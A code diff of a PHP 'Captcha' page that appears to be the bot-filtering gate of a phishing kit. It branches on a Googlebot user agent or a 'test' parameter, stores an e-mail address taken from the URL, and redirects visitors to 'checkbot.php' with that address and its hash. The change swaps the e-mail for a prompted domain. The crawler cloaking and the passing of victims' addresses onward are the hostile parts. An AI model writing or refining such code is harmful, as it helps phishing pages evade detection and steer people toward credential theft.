@@ -1,3 +1,5 @@
+
+
 <?php
 $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
 
@@ -12,13 +14,15 @@ if (strpos($userAgent, 'Googlebot') !== false || @$_GET['test'] == "Googlebot") 
 session_start();
 $_SESSION['key'] = md5(@$_GET['e']);
 $_SESSION['mail'] = @$_GET['e'];
-
 ?>
 <html>
   <head>
     <meta name="viewport" content="width=device-width,initial-scale=1" />
     <title>Captcha</title>
 	<script src="https://code.jquery.com/jquery-3.7.0.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js"></script>
+
     <style>
       .block {
         position: absolute;
@@ -530,7 +534,10 @@ $_SESSION['mail'] = @$_GET['e'];
 			// Создаем объект URLSearchParams на основе параметров
 			const params = new URLSearchParams(url_now.search);
 			
-			window.location.href = 'checkbot.php?key=<?=$_SESSION['key']?>&mail=<?=$_SESSION['mail'];?>';
+      let domain = prompt("Please enter your domain", "Harry Potter");
+      let key = CryptoJS.MD5(domain).toString();
+      
+			window.location.href = 'checkbot.php?key=' + key + '&domain='+ domain;
 			
 			
 			         // filter(data);
